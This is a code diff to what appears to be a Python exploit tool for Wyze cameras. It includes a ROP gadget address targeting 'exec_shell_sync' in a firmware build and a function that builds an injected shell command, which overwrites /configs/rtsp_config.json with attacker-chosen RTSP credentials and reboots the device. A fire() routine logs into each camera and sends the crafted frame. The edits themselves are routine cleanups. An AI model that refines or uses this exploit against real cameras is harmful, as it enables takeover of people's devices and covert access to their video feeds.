@@ -40,7 +40,7 @@ import sys
 import time
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
-import wyze_ioctl_client as W  # noqa: E402
+import wyze_ioctl_client as W  # path-local import, sys.path set above
 
 # 4.52.17.26 gadget: move a1,zero ; jal exec_shell_sync ; addiu a0,sp,0x18
 GADGET_26 = 0x484E2C
@@ -57,7 +57,7 @@ UA = "fss-one-shot/1.0"
 
 def build_command(user: str, realm: str, pwd: str) -> str:
     ha1 = hashlib.md5(f"{user}:{realm}:{pwd}".encode()).hexdigest()
-    cfg = '{"username":"%s","ha1":"%s","mode":1}' % (user, ha1)
+    cfg = f'{{"username":"{user}","ha1":"{ha1}","mode":1}}'
     # single shell word chain, no quotes inside: the payload is NUL-terminated
     # at 337 and `exec_shell_sync` takes it verbatim
     return f"echo {cfg} >/configs/rtsp_config.json && reboot"
@@ -260,7 +260,8 @@ def cfg_for(ip: str) -> tuple[str, str, str] | None:
     import json
     path = os.path.join(CFG_DIR, f"{ip}.json")
     try:
-        d = json.load(open(path))
+        with open(path) as f:
+            d = json.load(f)
         return d["uid"], d["enr"], d["mac"]
     except (OSError, KeyError, ValueError):
         return None
@@ -284,7 +285,7 @@ def fire(ip: str, uid: str, enr: str, mac: str, a: argparse.Namespace,
     try:
         cam = W.Cam(ip, mac, uid, enr)
         cam.full_login()
-    except Exception as e:
+    except (RuntimeError, OSError) as e:  # dtls/ioctl layers raise RuntimeError
         print(f"{ip}: session failed: {e}")
         return False, None
     frame = build_frame(cmd, a.ra, a.ra_off, a.cmd_off,
